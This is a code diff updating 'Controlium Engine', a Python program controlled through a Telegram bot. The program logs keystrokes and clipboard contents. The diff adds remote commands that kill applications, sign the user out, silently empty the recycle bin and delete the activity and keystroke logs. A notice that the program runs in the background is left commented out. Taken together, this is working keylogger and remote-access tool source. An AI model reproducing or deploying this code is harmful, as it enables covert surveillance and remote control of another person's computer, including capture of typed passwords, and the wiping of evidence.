@@ -28,6 +28,14 @@ from pynput import keyboard
 from plyer import notification
 
 
+# notification.notify(
+#     title="Controlium",
+#     message=f'''Program running in the background
+# Process ID: {pid}''',
+#     app_icon=None,
+#     timeout=5,)
+
+
 def telegram_alert(send):
     bot_token = "BOT TOKEN"
     my_chatID = "CHAT ID"
@@ -55,6 +63,12 @@ def command_engine(message):
             pass
         
         elif message.text.lower() == "stop":
+            notification.notify(
+                title="Controlium Engine",
+                message="Program Termianted",
+                app_icon=None,
+                timeout=3,)
+            
             bot.reply_to(message, "System terminated")
             subprocess.run(["taskkill", "/F", "/PID", str(pid)])
 
@@ -105,6 +119,66 @@ def command_engine(message):
         elif message.text.lower() == "database":
             os.startfile("C:/Program Files/Microsoft Office/root/Office16/MSACCESS.EXE")
             bot.reply_to(message, "Opened Microsoft Access")
+
+        elif message.text.lower() == "alert":
+            bot.reply_to(message, "Enter notification messeage")
+            bot.register_next_step_handler(message, win_notification)
+
+        elif message.text.lower() == "close chrome":
+            os.system("taskkill /f /im chrome.exe")
+            bot.reply_to(message, "Closed Chrome")
+
+        elif message.text.lower() == "close excel":
+            os.system("taskkill /f /im excel.exe")
+            bot.reply_to(message, "Closed Microsoft Excel")
+
+        elif message.text.lower() == "close word":
+            os.system("taskkill /f /im winword.exe")
+            bot.reply_to(message, "Closed Microsoft Word")
+
+        elif message.text.lower() == "close notepad":
+            os.system("taskkill /f /im notepad.exe")
+            bot.reply_to(message, "Closed Notepad")
+
+        elif message.text.lower() == "sign out":
+            subprocess.call(["shutdown", "/l"])
+            bot.reply_to(message, "System sign out")
+
+        elif message.text.lower() == "clear bin":
+            winshell.recycle_bin().empty(confirm=False, show_progress=True, sound=True)
+            bot.reply_to(message, "Recycle bin cleared")
+
+        elif message.text.lower() == "clear logs":
+            try:
+                act_log = "Activity Logs"
+                txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt")]
+                for f in txtfiles:
+                    os.remove(os.path.join(act_log, f))
+            except PermissionError:
+                bot.reply_to(message, "Deleted activity logs")
+
+        elif message.text.lower() == "clear keystrokes":
+            key_log = "Keystroke Logs"
+            txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]
+            for f in txtfiles2:
+                os.remove(os.path.join(key_log, f))
+            bot.reply_to(message, "Deleted keystroke logs")
+
+        elif ">" in message.text.lower():
+            usr_msg = message.text
+            speech_engine(usr_msg)
+            bot.reply_to(message, "Done")
+
+        elif message.text.lower() == "time":
+            time = datetime.datetime.now().strftime("%H:%M")
+            speech_engine(f"The time is {time}")
+            bot.reply_to(message, "Done")
+
+        elif "search" in message.text.lower():
+            indx = message.text.lower().split().index("search")
+            conv = message.text.split()[indx + 1:]
+            query = ' '.join([str(item) for item in conv])
+            webbrowser.open(f"https://www.google.com/search?q={query}")
 
         else:
             bot.reply_to(message, "Invalid Command")
@@ -191,7 +265,7 @@ def key_release(key):
 def log_keystrokes():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
     with open(key_log_file, "a") as f:
-        f.write(f'''CONTROLIUM ENGINE v1.2.0
+        f.write(f'''CONTROLIUM ENGINE v1.3.0
 {str(time_stamp)}
 << KEYSTROKE LOG >>
 
@@ -211,7 +285,7 @@ def log_keystrokes():
 
 def log_activity():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
-    logging.info(f'''CONTROLIUM ENGINE v1.2.0
+    logging.info(f'''CONTROLIUM ENGINE v1.3.0
 {str(time_stamp)}
 << ACTIVITY LOG >>
 
@@ -248,6 +322,16 @@ def clipboard_activity():
         if current_clipboard != before_clipboard:
             logging.info(f"Clipboard changes: {current_clipboard}")
             before_clipboard = current_clipboard
+
+
+
+def speech_engine(speak):
+    engine = pyttsx3.init("sapi5")
+    engine.setProperty("rate", 150)
+    voices = engine.getProperty('voices')
+    engine.setProperty("voice", voices[1].id)
+    engine.say(speak)
+    engine.runAndWait()
 
 
 def time_info():
